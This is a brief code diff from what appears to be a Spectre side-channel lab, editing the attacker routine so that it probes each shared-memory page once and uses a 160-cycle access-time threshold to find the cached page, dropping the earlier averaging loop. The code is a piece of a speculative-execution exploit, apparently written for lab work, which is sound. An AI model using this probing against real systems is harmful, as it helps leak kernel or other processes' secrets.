@@ -56,16 +56,11 @@ int run_attacker(char *shared_memory) {
         init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);
         call_kernel_part2(shared_memory, current_offset);
         int page;
+
         for (page = 0; page < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; page++){
-            uint64_t access_time = 0;
-            int num_tries = 4;
-            for (int i = 0; i < num_tries; i++) {
-                uint64_t new_access = time_access(&shared_memory[page * SHD_SPECTRE_LAB_PAGE_SIZE]);
-                printf("new access time %ld \n", new_access);
-                access_time = access_time + new_access;
-            }
-            if ((access_time/num_tries) < 160) {
-                printf("access time %ld \n", access_time/num_tries);
+            uint64_t access_time = time_access(&shared_memory[page * SHD_SPECTRE_LAB_PAGE_SIZE]);
+            if (access_time < 160) {
+                //printf("access time %ld \n", access_time);
                 break;
             }
         }
